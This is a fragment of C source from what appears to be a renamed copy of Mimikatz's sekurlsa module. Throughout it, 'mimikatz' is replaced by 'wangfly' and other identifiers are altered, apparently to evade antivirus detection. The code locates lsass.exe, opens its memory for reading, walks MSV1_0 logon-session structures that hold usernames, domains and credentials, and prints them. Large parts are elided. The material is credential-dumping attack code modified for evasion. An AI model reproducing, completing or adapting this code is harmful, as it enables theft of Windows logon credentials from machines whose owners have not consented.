...
const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	...
	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_wangfly), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_wangfly, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_wangfly, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_wangfly, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_wangfly, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_wangfly, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_wangfly, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_wangfly, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_wangfly, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_wangfly, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_wangfly, LogonServer)},
...
NTSTATUS kuhl_m_sekurlsa_acquireLSA()
{
	...
	DWORD processRights = PROCESS_VM_READ | ((wangfly_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
	BOOL isError = FALSE;
	PBYTE pSk;
	...
	if(!cLsass.hLsassMem)
	{
		...
		else
		{
			...
			lstrcatW(str, L".exe");
			if(kull_m_process_getProcessIdForName(str, &pid))
			...
			if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
			{
				...
				else
				{
					...
					if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
						PRINT_ERROR(wangfly L" " wangfly_ARCH L" cannot access x64 process\n");
					else
				#endif
					{						
						cLsass.osContext.MajorVersion = wangfly_NT_MAJOR_VERSION;
						cLsass.osContext.MinorVersion = wangfly_NT_MINOR_VERSION;
						cLsass.osContext.BuildNumber  = wangfly_NT_BUILD_NUMBER;
					}
				}
...
#pragma warning(pop)
	...
	{
		if(wangfly_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
			...
			if(msvCredentials = (PBYTE) ((PUNICODE_STRING) mesCreds)->Buffer)
			{
				...
				switch(type)
				{
					case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY:
						...
						kprintf(L"\n\t * Username : %wZ\n\t * Doma__in   : %wZ", (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain));
